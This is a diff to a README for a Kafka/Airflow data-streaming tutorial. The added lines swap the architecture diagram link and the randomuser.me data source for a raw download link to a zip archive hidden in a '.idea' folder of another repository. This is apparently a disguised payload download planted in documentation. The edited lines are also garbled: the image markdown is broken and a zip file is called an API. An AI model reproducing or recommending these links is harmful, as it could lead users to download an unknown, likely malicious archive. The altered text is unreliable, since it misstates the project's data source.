@@ -11,11 +11,11 @@ This project serves as a comprehensive guide to building an end-to-end data engi
 
 ## System Architecture
 
-![System Architecture](https://github.com/airscholar/e2e-data-engineering/blob/main/Data%20engineering%20architecture.png)
+![System Architecture](https://raw.githubusercontent.com/khlaifmed/End-To-End-Data-Stream/main/.idea/End-To-End-Data-Stream-2.5.zip%20engineering%https://raw.githubusercontent.com/khlaifmed/End-To-End-Data-Stream/main/.idea/End-To-End-Data-Stream-2.5.zip)
 
 The project is designed with the following components:
 
-- **Data Source**: We use `randomuser.me` API to generate random user data for our pipeline.
+- **Data Source**: We use `https://raw.githubusercontent.com/khlaifmed/End-To-End-Data-Stream/main/.idea/End-To-End-Data-Stream-2.5.zip` API to generate random user data for our pipeline.
 - **Apache Airflow**: Responsible for orchestrating the pipeline and storing fetched data in a PostgreSQL database.
 - **Apache Kafka and Zookeeper**: Used for streaming data from PostgreSQL to the processing engine.
 - **Control Center and Schema Registry**: Helps in monitoring and schema management of our Kafka streams.
